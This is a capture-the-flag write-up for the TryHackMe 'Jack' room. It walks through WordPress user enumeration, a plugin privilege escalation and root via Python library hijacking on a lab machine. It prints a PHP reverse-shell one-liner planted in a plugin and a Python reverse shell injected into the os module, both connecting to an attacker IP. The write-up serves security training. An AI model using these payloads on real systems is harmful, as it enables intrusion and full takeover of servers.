# Jack
[TryHackMe room link](https://tryhackme.com/room/jack)

# Informations about the room

> Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module.

# Open ports

22 OpenSSH 7.2p2

80 Apache httpd 2.4.18

# Enumeration

This webserver has wordpress

`WordPress version 5.3.2`

Users found with author IDs bruteforcing:
```console
[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Password found:
```
[!] Valid Combinations Found:
 | Username: wendy, Password: REDACTED
```

# Privilege escalation

After logging in we are not admin

But there is a plugin, User Role editor, that is [vulnerable](https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/) to privilege escalation  

We need to intercept a update profile request and append `&ure_other_roles=administrator` at the end

To get a reverse shell i used to modify the 404.php but for some reason it's not working so i edited the `hello dolly` plugin and added a reverse shell:

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.37.155 1234 >/tmp/f');?>
```

There is a `reminder.txt` in jack's home directory:

`Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.`

There is a private ssh key in `/var/backups/id_rsa`

That is jack's private ssh key 

Linpeas found a `/opt/statuscheck`

It's a folder with a python script that runs every 2 minutes according to the logs:

```python
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
```

The script is using the `os` library

We can add a python reverse shell at the end of the library file and get a callback after 2 minutes:
```python
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.37.155",7777))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```
